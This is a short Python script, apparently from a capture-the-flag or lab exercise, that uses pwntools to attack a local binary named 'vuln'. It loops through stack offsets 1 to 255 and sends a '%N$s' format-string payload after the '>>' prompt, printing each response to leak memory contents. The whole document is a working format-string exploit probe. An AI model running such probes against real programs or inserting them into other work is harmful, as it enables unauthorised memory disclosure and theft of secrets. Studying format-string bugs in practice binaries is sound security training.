#! /bin/python3

import pwn


elf=pwn.ELF("./vuln")

for i in range(1, 256):

    payload = b"".join([b"%" + str(i).encode("utf-8") + b"$s"])

    p=elf.process()

    p.recvuntil(b">>")
    p.sendline(payload)
    resp=p.recvall().decode("latin-1")
    print(resp)
